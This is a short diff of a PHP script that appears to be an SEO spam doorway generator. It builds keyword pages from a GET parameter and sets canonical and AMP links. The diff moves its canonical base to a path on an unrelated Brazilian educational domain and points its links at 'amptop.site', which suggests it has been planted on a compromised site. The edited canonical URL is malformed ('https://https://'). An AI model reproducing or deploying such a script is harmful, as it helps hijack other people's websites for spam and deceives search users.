@@ -1,6 +1,6 @@
 <?php
-if (isset($_GET['nam'])) {
-    $Param= $_GET['nam'];
+if (isset($_GET['google-index'])) {
+    $Param= $_GET['google-index'];
 }else{
     $Param="";
 }
@@ -10,9 +10,9 @@ $gantiParam = str_replace ("-", " ",$Param);
 $kwtitle = ucwords($gantiParam);
 $kwsmall = strtolower($kwtitle);
 $kwbig = strtoupper($kwtitle);
-$urlDomain= "https://dmt-arta.co.id/cgi/?nam=";
+$urlDomain= "https://https://ead.faculdadeeficaz.edu.br/babe/?google-index=";
 $canonical = $urlDomain.'/'.$Param;
-$amphtml = "https://amptop.site/arta/?nam=".$Param."";
+$amphtml = "https://amptop.site/babe/?google-index=".$Param."";
 $favicon = "https://ik.imagekit.io/2at4km90f/favicon-suhu-acuan.png";
 $linkTarget = "https://amptop.site/arta/?nam=".$Param."";
 //////////////////////////////////////////////////////////////////////////
